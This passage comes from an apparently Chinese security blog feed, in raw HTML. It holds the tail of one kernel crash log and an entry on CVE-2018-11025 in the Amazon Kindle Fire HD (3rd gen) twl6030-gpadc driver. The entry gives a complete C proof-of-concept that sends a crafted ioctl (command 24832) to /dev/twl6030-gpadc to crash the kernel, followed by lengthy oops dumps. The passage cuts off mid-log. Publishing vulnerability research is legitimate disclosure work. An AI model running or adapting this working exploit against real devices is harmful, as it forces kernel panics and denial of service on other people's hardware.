00000000 dd3eec80 00000000 00000000 00000000</span><br><span class="line">[   96.638275] ec88  00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000</span><br><span class="line">[   96.648864] eca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[   96.659423] ecc8  dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7</span><br><span class="line">[   96.669921] ece8  2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[   96.680572] ed08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24</span><br><span class="line">[   96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit &#x3D; 0xd02be2f8)</span><br><span class="line">[   96.698455] Stack: (0xd02bfdd8 to 0xd02c0000)</span><br><span class="line">[   96.703430] fdc0:                                                       0000020a 00000082</span><br><span class="line">[   96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08</span><br><span class="line">[   96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800</span><br><span class="line">[   96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000</span><br><span class="line">[   96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec</span><br><span class="line">[   96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0</span><br><span class="line">[   96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8</span><br><span class="line">[   96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14</span><br><span class="line">[   96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000</span><br><span class="line">[   96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08</span><br><span class="line">[   96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[   96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004</span><br><span class="line">[   96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[   96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8</span><br><span class="line">[   96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608</span><br><span class="line">[   96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624</span><br><span class="line">[   96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 006f0063 002e006d</span><br><span class="line">[   96.867340] Backtrace: </span><br><span class="line">[   96.870330] [&lt;c06a4d50&gt;] (__raw_spin_lock_irqsave+0x0&#x2F;0xb0) from [&lt;c06a4e10&gt;] (_raw_spin_lock_irqsave+0x10&#x2F;0x14)</span><br><span class="line">[   96.881591]  r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a</span><br><span class="line">[   96.888488] [&lt;c06a4e00&gt;] (_raw_spin_lock_irqsave+0x0&#x2F;0x14) from [&lt;c06a4e24&gt;] (_raw_spin_lock_irq+0x10&#x2F;0x14)</span><br><span class="line">[   96.899291] [&lt;c06a4e14&gt;] (_raw_spin_lock_irq+0x0&#x2F;0x14) from [&lt;c06a3008&gt;] (wait_for_common+0x28&#x2F;0x150)</span><br><span class="line">[   96.909729] [&lt;c06a2fe0&gt;] (wait_for_common+0x0&#x2F;0x150) from [&lt;c06a319c&gt;] (wait_for_completion_interruptible_timeout+0x14&#x2F;0x18)</span><br><span class="line">[   96.922149] [&lt;c06a3188&gt;] (wait_for_completion_interruptible_timeout+0x0&#x2F;0x18) from [&lt;c0317c28&gt;] (dev_ioctl+0x7ec&#x2F;0x10c4)</span><br><span class="line">[   96.934204] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[   96.943481] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[   96.952636] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   96.961822]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638</span><br><span class="line">[   96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) </span><br><span class="line">[   96.977264] Board Information: </span><br><span class="line">[   96.977264]  Revision : 0001</span><br><span class="line">[   96.977294]  Serial	: 0000000000000000</span><br><span class="line">[   96.977294] SoC Information:</span><br><span class="line">[   96.977294]  CPU	: OMAP4470</span><br><span class="line">[   96.977294]  Rev	: ES1.0</span><br><span class="line">[   96.977325]  Type	: HS</span><br><span class="line">[   96.977325]  Production ID: 0002B975-000000CC</span><br><span class="line">[   96.977325]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[   96.977355] </span><br><span class="line">[   97.013824] ---[ end trace 2432291f2b5d99ba ]---</span><br><span class="line">[   97.019195] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[   97.025024] CPU1: stopping</span><br><span class="line">[   97.028137] Backtrace: </span><br><span class="line">[   97.031311] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[   97.040679]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[   97.047668] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[   97.056884] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[   97.066253] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[   97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70)</span><br><span class="line">[   97.081237] 7d20:                   c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40</span><br><span class="line">[   97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70</span><br><span class="line">[   97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff</span><br><span class="line">[   97.105346]  r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004</span><br><span class="line">[   97.112487] [&lt;c06a485c&gt;] (_raw_spin_unlock_irq+0x0&#x2F;0x50) from [&lt;c0074004&gt;] (finish_task_switch+0x58&#x2F;0x12c)</span><br><span class="line">[   97.123321] [&lt;c0073fac&gt;] (finish_task_switch+0x0&#x2F;0x12c) from [&lt;c06a36fc&gt;] (__schedule+0x3ec&#x2F;0x830)</span><br><span class="line">[   97.133239]  r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340</span><br><span class="line">[   97.141143] r3:00000001</span><br><span class="line">[   97.144500] [&lt;c06a3310&gt;] (__schedule+0x0&#x2F;0x830) from [&lt;c06a3c24&gt;] (preempt_schedule+0x40&#x2F;0x5c)</span><br><span class="line">[   97.154174] [&lt;c06a3be4&gt;] (preempt_schedule+0x0&#x2F;0x5c) from [&lt;c06a4808&gt;] (_raw_spin_unlock+0x48&#x2F;0x4c)</span><br><span class="line">[   97.164337]  r4:c0a7375c r3:00000002</span><br><span class="line">[   97.168731] [&lt;c06a47c0&gt;] (_raw_spin_unlock+0x0&#x2F;0x4c) from [&lt;c00983d0&gt;] (futex_wake+0xfc&#x2F;0x130)</span><br><span class="line">[   97.178436] [&lt;c00982d4&gt;] (futex_wake+0x0&#x2F;0x130) from [&lt;c0099868&gt;] (do_futex+0xf8&#x2F;0x9e8)</span><br><span class="line">[   97.187469] [&lt;c0099770&gt;] (do_futex+0x0&#x2F;0x9e8) from [&lt;c009a1ec&gt;] (sys_futex+0x94&#x2F;0x178)</span><br><span class="line">[   97.196289] [&lt;c009a158&gt;] (sys_futex+0x0&#x2F;0x178) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[   97.205871] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[   97.209930] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[   97.214111] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[   97.218170] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[   97.222229] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[   97.226409] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[   97.230468] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[   97.234527] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[   97.238739] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[   97.242767] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[   97.246826] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[   97.251007] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[   97.255065] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[   97.259124] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[   97.263183] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[   97.267364] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[   97.271423] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[   97.275482] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[   97.279693] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[   97.283752] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[   97.287811] </span><br><span class="line">[   97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[   97.289611] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11025%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/mfd/twl6030-gpadc.c允许攻击者通过设备/ dev / twl6030上的ioctl的参数注入特制的参数-gpadc命令<strong>24832</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / twl6030-gpadc，并使用命令<strong>24832</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes </span></span><br><span class="line"><span class="comment"> * the system crash via IOCTL 24832. </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/twl6030-gpadc&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">24832</span>; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> channel;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">twl6030_gpadc_user_parms</span> <span class="title">payload</span>;</span></span><br><span class="line">        payload.channel = <span class="number">0x9b2a9212</span>;</span><br><span class="line">        payload.status = <span class="number">0x0</span>;</span><br><span class="line">        payload.result = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try ioctl device file &#x27;%s&#x27;, with command 0x%x and payload NULL\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[18460.321624] Unable to handle kernel paging request at virtual address 4b3f25fc</span><br><span class="line">[18460.330139] pgd &#x3D; ca210000</span><br><span class="line">[18460.333251] [4b3f25fc] *pgd&#x3D;00000000</span><br><span class="line">[18460.337768] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[18460.343810] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[18460.351440] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[18460.358825] PC is at twl6030_gpadc_ioctl+0x160&#x2F;0x180</span><br><span class="line">[18460.364379] LR is at twl6030_gpadc_conversion+0x5c&#x2F;0x484</span><br><span class="line">[18460.370452] pc : [&lt;c031b080&gt;]    lr : [&lt;c031a950&gt;]    psr: 60030013</span><br><span class="line">[18460.370452] sp : de94dd90  ip : 00000000  fp : de94df04</span><br><span class="line">[18460.383422] r10: 00000000  r9 : dcccf608  r8 : bea875ec</span><br><span class="line">[18460.389282] r7 : de94c000  r6 : 00000000  r5 : 00006100  r4 : bea875ec</span><br><span class="line">[18460.396697] r3 : fffffeb4  r2 : 4b3f2730  r1 : de94dee8  r0 : 00000001</span><br><span class="line">[18460.404113] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[18460.412048] Control: 10c5387d  Table: 8a21004a  DAC: 00000015</span><br><span class="line">[18460.418609] </span><br><span class="line">[18460.418609] PC: 0xc031b000:</span><br><span class="line">[18460.423583] b000  e24b101c e30f3eb4 e34f3fff e0822082 e0812102 e51220e4 e18120b3 e5973008</span><br><span class="line">[18460.434234] b020  e294200c 30d22003 33a03000 e3530000 0a000006 e3e0000c e24bd01c e89da8f0</span><br><span class="line">[18460.444885] b040  e24b0e17 e3a0100c ebfcf5c4 eafffff8 e1a00004 e24b1e17 e3a0200c ebfced7f</span><br><span class="line">[18460.455444] b060  e3500000 0afffff3 eafffff1 e51b2170 e24b101c e30f3eb4 e34f3fff e0812102</span><br><span class="line">[18460.465972] b080  e5122134 e18120b3 eaffffe3 03e0303c 150b016c 050b316c eaffffdf c0acabbc</span><br><span class="line">[18460.476623] b0a0  e1a0c00d e92dd800 e24cb004 e59030e0 e3530000 159000ec 03e00012 e89da800</span><br><span class="line">[18460.487182] b0c0  e1a0c00d e92dd800 e24cb004 e59000f0 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.497863] b0e0  e5d020e9 e5d030e8 e1820003 e2000003 e89da800 e1a0c00d e92dd800 e24cb004</span><br><span class="line">[18460.508544] </span><br><span class="line">[18460.508544] LR: 0xc031a8d0:</span><br><span class="line">[18460.513519] a8d0  e89da878 e1a00004 ebffff20 e2000003 e3500002 13e0000a 03a00000 e89da878</span><br><span class="line">[18460.524078] a8f0  c09ba0c0 e1a0c00d e92ddff0 e24cb004 e24dd014 e2509000 0a000114 e59f5454</span><br><span class="line">[18460.534759] a910  e595008c e3500000 0a00010b e2800004 eb0e1ff0 e1d910b6 e3510001 9a00000a</span><br><span class="line">[18460.545318] a930  e595308c e3e06015 e59f142c e5930000 ebff4e6b e595a08c e28a0004 eb0e1f69</span><br><span class="line">[18460.555999] a950  e1a00006 e24bd028 e89daff0 e595a08c e3a03f52 e023a193 e5933038 e3530000</span><br><span class="line">[18460.566680] a970  13e0600f 1afffff3 e59a32c4 e0818101 e595c088 e3130010 e08c7008 1a000025</span><br><span class="line">[18460.577331] a990  e3510000 0a0000c4 e1d930b8 e3530001 0a0000d7 e1d940b6 e3540000 0a0000bc</span><br><span class="line">[18460.587890] a9b0  e3a0000e e3a01002 e3a02090 e5956088 ebfff8bc e3540001 0a0000d1 e1d920b6</span><br><span class="line">[18460.598571] </span><br><span class="line">[18460.598571] SP: 0xde94dd10:</span><br><span class="line">[18460.603546] dd10  00000000 0000000d de94dda0 10624dd3 de94dd4c c031b080 60030013 ffffffff</span><br><span class="line">[18460.614196] dd30  de94dd7c bea875ec de94df04 de94dd48 c06a5318 c0008370 00000001 de94dee8</span><br><span class="line">[18460.624877] dd50  4b3f2730 fffffeb4 bea875ec 00006100 00000000 de94c000 bea875ec dcccf608</span><br><span class="line">[18460.635528] dd70  00000000 de94df04 00000000 de94dd90 c031a950 c031b080 60030013 ffffffff</span><br><span class="line">[18460.646087] dd90  de94ddac 9b2a9212 00000000 00000000 00040000 0001f8fc 00000000 00000000</span><br><span class="line">[18460.656738] ddb0  c00795a0 00000001 de94ddd4 de94ddc8 c00795b4 c00792bc de94de0c de94ddd8</span><br><span class="line">[18460.667419] ddd0  c0070df8 c00795ac de94c000 00000001 00000004 dd32f8f4 60000013 00000001</span><br><span class="line">[18460.678100] ddf0  00000001 00000004 dd32f800 00000000 00000000 de94de10 c00723a0 c06a4818</span><br><span class="line">[18460.688629] </span><br><span class="line">[18460.688659] FP: 0xde94de84:</span><br><span class="line">[18460.693725] de84  de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0</span><br><span class="line">[18460.704284] dea4  000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000</span><br><span class="line">[18460.714935] dec4  00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000</span><br><span class="line">[18460.725616] dee4  00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044</span><br><span class="line">[18460.736328] df04  c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8</span><br><span class="line">[18460.746856] df24  de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.757537] df44  00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000</span><br><span class="line">[18460.768096] df64  00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[18460.778625] </span><br><span class="line">[18460.778625] R1: 0xde94de68:</span><br><span class="line">[18460.783721] de68  c2572140 de94debc 00000001 00000028 000fffff 00000001 de94dedc de94de90</span><br><span class="line">[18460.794403] de88  c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 000fffff</span><br><span class="line">[18460.804962] dea8  00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 00000001</span><br><span class="line">[18460.815643] dec8  dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 00000000</span><br><span class="line">[18460.826202] dee8  00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 c031af2c</span><br><span class="line">[18460.836730] df08  00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 de94df0c</span><br><span class="line">[18460.847381] df28  de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.858032] df48  de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 00000000</span><br><span class="line">[18460.868713] </span><br><span class="line">[18460.868713] R3: 0xfffffe34:</span><br><span class="line">[18460.873687] fe34  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.884246] fe54  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.894805] fe74  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.905456] fe94  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.916137] feb4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.926788] fed4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.937347] fef4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.948028] ff14  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[18460.958709] </span><br><span class="line">[18460.958709] R7: 0xde94bf80:</span><br><span class="line">[18460.963684] bf80  de926680 c00635cc 00000013 de84190c de926680 c00635cc 00000013 00000000</span><br><span class="line">[18460.974365] bfa0  00000000 00000000 de94bff4 de94bfb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[18460.985015] bfc0  de926680 00000000 00000000 00000000 de94bfd0 de94bfd0 00000000 de84190c</span><br><span class="line">[18460.995574] bfe0  c0068a64 c004cd64 00000000 de94bff8 c004cd64 c0068a70 1d04e2fb 1dfbe204</span><br><span class="line">[18461.006225] c000  00000000 00000002 00000000 c2572140 c0a0e840 00000000 00000015 cf9fca80</span><br><span class="line">[18461.016906] c020  00000000 de94c000 c09ddc50 c2572140 c25717c0 c1617b40 de94da7c de94d9c8</span><br><span class="line">[18461.027587] c040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[18461.038146] c060  00c5f4c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.048828] </span><br><span class="line">[18461.048828] R9: 0xdcccf588:</span><br><span class="line">[18461.053802] f588  dcccf588 dcccf588 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[18461.064483] f5a8  00000000 00000000 dcccf5b0 dcccf5b0 00000000 dcccf5bc dcccf5bc 00000000</span><br><span class="line">[18461.075134] f5c8  5ae3ed25 00000000 00000000 00000000 dcccf5e0 00000000 00000000 00000000</span><br><span class="line">[18461.085815] f5e8  00200000 00000000 00000000 dcccf5f4 dcccf5f4 dccb2440 dccb2440 00000000</span><br><span class="line">[18461.096343] f608  00052180 00000000 00000000 00000000 00000000 00000000 c06b9600 dd1a4800</span><br><span class="line">[18461.107025] f628  dcccf6e0 dccb0300 00000c45 00000001 00a0003b 5ae3ed25 2bc5ac58 5ae3ed25</span><br><span class="line">[18461.117675] f648  2bc5ac58 5ae3ed25 2bc5ac58 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[18461.128234] f668  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dcccf684</span><br><span class="line">[18461.138885] Process twl6030_gpadc_i (pid: 12849, stack limit &#x3D; 0xde94c2f8)</span><br><span class="line">[18461.146697] Stack: (0xde94dd90 to 0xde94e000)</span><br><span class="line">[18461.151611] dd80:                                     de94ddac 9b2a9212 00000000 00000000</span><br><span class="line">[18461.160827] dda0: 00040000 0001f8fc 00000000 00000000 c00795a0 00000001 de94ddd4 de94ddc8</span><br><span class="line">[18461.170043] ddc0: c00795b4 c00792bc de94de0c de94ddd8 c0070df8 c00795ac de94c000 00000001</span><br><span class="line">[18461.179138] dde0: 00000004 dd32f8f4 60000013 00000001 00000001 00000004 dd32f800 00000000</span><br><span class="line">[18461.188354] de00: 00000000 de94de10 c00723a0 c06a4818 00000004 00000001 dd32e0d8 dd32f800</span><br><span class="line">[18461.197570] de20: dd32e000 0000000a de94c000 c26fda80 de94de54 de94de40 c02ba53c c0072360</span><br><span class="line">[18461.206787] de40: dd32f800 dd32e000 de94de74 de94de58 c02c3c88 c02ba518 dd32e000 00000002</span><br><span class="line">[18461.215881] de60: 00000002 dd32fbbc c2572140 de94debc 00000001 00000028 000fffff 00000001</span><br><span class="line">[18461.225097] de80: de94dedc de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8</span><br><span class="line">[18461.234313] dea0: c00723a0 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14</span><br><span class="line">[18461.243408] dec0: 00000000 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000</span><br><span class="line">[18461.252624] dee0: 00000000 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08</span><br><span class="line">[18461.261840] df00: c0136044 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490</span><br><span class="line">[18461.271057] df20: d8f925d8 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.280151] df40: de94c000 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004</span><br><span class="line">[18461.289367] df60: de94c000 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[18461.298583] df80: 00000400 bea87618 00010e5c 00000000 00000036 c0013e08 00000000 de94dfa8</span><br><span class="line">[18461.307800] dfa0: c0013c60 c0136578 bea87618 00010e5c 00000004 00006100 bea875ec bea875ec</span><br><span class="line">[18461.316894] dfc0: bea87618 00010e5c 00000000 00000036 00000000 00000000 00000000 bea87604</span><br><span class="line">[18461.326110] dfe0: 00000000 bea875d4 00010698 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[18461.335296] Backtrace: </span><br><span class="line">[18461.338317] [&lt;c031af20&gt;] (twl6030_gpadc_ioctl+0x0&#x2F;0x180) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[18461.348571]  r7:d683fb40 r6:00000004 r5:d683fb40 r4:00000000</span><br><span class="line">[18461.355560] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[18461.364807] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[18461.374206]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e5c r4:bea87618</span><br><span class="line">[18461.382507] Code: e24b101c e30f3eb4 e34f3fff e0812102 (e5122134) </span><br><span class="line">[18461.401061] Board Information: </span><br><span class="line">[18461.401061]  Revision : 0001</span><br><span class="line">[18461.401092]  Serial	: 0000000000000000</span><br><span class="line">[18461.401092] SoC Information:</span><br><span class="line">[18461.401092]  CPU	: OMAP4470</span><br><span class="line">[18461.401122]  Rev	: ES1.0</span><br><span class="line">[18461.401122]  Type	: HS</span><br><span class="line">[18461.401122]  Production ID: 0002B975-000000CC</span><br><span class="line">[18461.401122]  Die ID	: 